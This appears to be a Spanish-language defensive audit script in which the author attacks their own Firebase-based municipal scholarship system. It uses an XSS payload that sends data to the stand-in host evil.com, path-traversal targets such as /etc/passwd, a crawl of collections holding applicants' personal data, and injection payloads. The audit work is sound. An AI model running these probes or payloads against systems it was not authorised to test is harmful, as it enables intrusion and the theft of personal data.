/**
 * ============================================================
 *  AUDITORÍA OFENSIVA AVANZADA — NIVEL 2
 *  Proyecto: Sistema de Becas Municipal 2026
 *
 *  Este script actúa como un atacante externo que tiene acceso
 *  a las credenciales públicas de Firebase (igual que cualquier
 *  persona que abra el código fuente de la web).
 *
 *  Lo que prueba:
 *    1. Storage — MIME-Spoofing (HTML disfrazado de PDF)
 *    2. Storage — Exceso de tamaño (1MB, límite es 500KB)
 *    3. Storage — Path Traversal (salir de la carpeta base)
 *    4. Cloud Functions — Bypass de App Check vía HTTP directo
 *    5. Firestore — Crawl de colecciones sensibles
 *    6. Cloud Functions — Inyección XSS / Payload malicioso
 * ============================================================
 */

import { initializeApp } from "firebase/app";
import { getFirestore, collection, getDocs } from "firebase/firestore";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { getFunctions, httpsCallable } from "firebase/functions";

const firebaseConfig = {
  apiKey: "AIzaSyBkQsbdEcuP_p1gF-l54yTFNbee5QkADlY",
  authDomain: "beca-muni-2026.firebaseapp.com",
  projectId: "beca-muni-2026",
  storageBucket: "beca-muni-2026.firebasestorage.app",
  messagingSenderId: "898354032602",
  appId: "1:898354032602:web:67597b84abe91f33ab1ae3"
};

const app   = initializeApp(firebaseConfig);
const db    = getFirestore(app);
const store = getStorage(app);
const fnc   = getFunctions(app, 'southamerica-west1');

// URL real de la función (obtenida con: gcloud functions describe ...)
const FUNCTION_URL = "https://verificarelegibilidadpostulacion-7rcxrgnorq-tl.a.run.app";

function ok(msg) { console.log(`  ✅ PROTECCIÓN ACTIVA : ${msg}`); }
function vuln(msg) { console.log(`  ❌ VULNERABILIDAD    : ${msg}`); }
function attack(n, desc) { console.log(`\n⚔️  ATAQUE ${n}: ${desc}`); }

async function runAudit() {
  console.log("╔══════════════════════════════════════════════════════════╗");
  console.log("║      AUDITORÍA OFENSIVA AVANZADA — NIVEL 2              ║");
  console.log("╚══════════════════════════════════════════════════════════╝\n");

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 1: MIME-Spoofing en Storage
  // Subir HTML con código XSS, pero declarando contentType = PDF
  // ─────────────────────────────────────────────────────────────
  attack(1, "Storage — Archivo HTML disfrazado de PDF (MIME-Spoofing)");
  try {
    const maliciousContent = "<html><body><script>fetch('https://evil.com?rut='+window.name)</script></body></html>";
    const blob = new Blob([maliciousContent], { type: 'application/pdf' }); // type falso
    const storageRef = ref(store, 'pentest/xss_disfrazado_pdf.pdf');
    await uploadBytes(storageRef, blob, { contentType: 'application/pdf' });
    vuln("Pude subir HTML con cabecera PDF. Riesgo de XSS al servirlo.");
  } catch (e) {
    ok(`Storage rechazó: ${e.code ?? e.message}`);
  }

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 2: Exceso de Tamaño en Storage
  // Intentar subir 1MB cuando el límite permitido es 500KB
  // ─────────────────────────────────────────────────────────────
  attack(2, "Storage — Archivo de 1MB (límite es 500KB)");
  try {
    const largeBuffer = new Uint8Array(1024 * 1024).fill(0x25); // 1MB de bytes 0x25 ('%')
    const storageRef  = ref(store, 'pentest/archivo_enorme.pdf');
    await uploadBytes(storageRef, largeBuffer, { contentType: 'application/pdf' });
    vuln("Límite de tamaño ignorado. Se pudo subir un archivo de 1MB.");
  } catch (e) {
    ok(`Bloqueado por max: ${e.code ?? e.message}`);
  }

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 3: Path Traversal en Storage
  // Intentar escribir fuera de la carpeta postulaciones/
  // ─────────────────────────────────────────────────────────────
  attack(3, "Storage — Path Traversal (escritura fuera de /postulaciones)");
  const traversalPaths = [
    '../etc/passwd',
    '/etc/passwd',
    'config/serviceAccount.json',
    '../../admin/secret.pdf',
  ];
  for (const path of traversalPaths) {
    try {
      const blob = new Blob(['traversal test']);
      await uploadBytes(ref(store, path), blob);
      vuln(`Path traversal exitoso en: ${path}`);
    } catch (e) {
      ok(`Ruta "${path}" bloqueada: ${e.code ?? e.message}`);
    }
  }

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 4: Bypass de App Check (HTTP directo)
  // Llamada a la URL de Cloud Function sin pasar por el SDK
  // → Si App Check está activo, debe responder 401 o UNAUTHENTICATED
  // ─────────────────────────────────────────────────────────────
  attack(4, "Cloud Function — HTTP Directo sin App Check (Blind Bypass)");
  try {
    const res = await fetch(FUNCTION_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ data: { rut: "1-9" } })
    });
    const body = await res.text();
    if (res.status === 200) {
      vuln(`Función respondió 200 sin App Check. Cuerpo: ${body.slice(0, 100)}`);
    } else {
      ok(`HTTP ${res.status} recibido (esperado 401/403). App Check está aplicado.`);
    }
  } catch (e) {
    ok(`Conexión rechazada o CORS bloqueó: ${e.message}`);
  }

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 5: Crawl de Colecciones Sensibles en Firestore
  // Un atacante intenta leer todas las colecciones conocidas
  // ─────────────────────────────────────────────────────────────
  attack(5, "Firestore — Crawl de colecciones sensibles");
  const targets = [
    "users",           // perfiles de admin/revisor
    "postulantes",     // datos personales de los becarios
    "mail",            // copia de correos enviados
    "config",          // configuración del sistema
    "historical_ruts", // RUTs históricos (requiere read en reglas)
    "rejected_entry",  // rechazos de entrada
  ];
  for (const col of targets) {
    try {
      const snap = await getDocs(collection(db, col));
      vuln(`Colección /${col} EXPUESTA — ${snap.size} documentos leídos.`);
    } catch (e) {
      ok(`/${col} bloqueado: ${e.code}`);
    }
  }

  // ─────────────────────────────────────────────────────────────
  // ATAQUE 6: Inyección XSS vía SDK de Functions
  // Enviar payloads maliciosos como si fueran datos legítimos
  // → Zod en el backend debe rechazarlos como invalid-argument
  // ─────────────────────────────────────────────────────────────
  attack(6, "Cloud Function — Payloads de Inyección XSS / NoSQL");
  const payloads = [
    { label: "XSS en RUT",         input: { rut: "<script>alert(1)</script>" } },
    { label: "SQL-like en RUT",     input: { rut: "1-9; DROP TABLE users;--" } },
    { label: "Objeto anidado",      input: { rut: { $gt: "" } } },
    { label: "RUT excesivamente largo", input: { rut: "1".repeat(500) } },
  ];
  const verifyFn = httpsCallable(fnc, 'verificarElegibilidadPostulacion');
  for (const { label, input } of payloads) {
    try {
      const res = await verifyFn(input);
      vuln(`"${label}" fue ACEPTADO por el backend: ${JSON.stringify(res.data)}`);
    } catch (e) {
      if (e.code === 'functions/invalid-argument') {
        ok(`"${label}" rechazado por validación Zod (invalid-argument).`);
      } else {
        ok(`"${label}" bloqueado: ${e.code} — ${e.message?.slice(0, 80)}`);
      }
    }
  }

  // ─────────────────────────────────────────────────────────────
  // RESUMEN
  // ─────────────────────────────────────────────────────────────
  console.log("\n╔══════════════════════════════════════════════════════════╗");
  console.log("║  Auditoría completada.                                   ║");
  console.log("║  Todos los ✅ = sistema protegido.                      ║");
  console.log("║  Cualquier ❌ = vulnerabilidad real a corregir urgente. ║");
  console.log("╚══════════════════════════════════════════════════════════╝");
}

runAudit().catch(console.error);
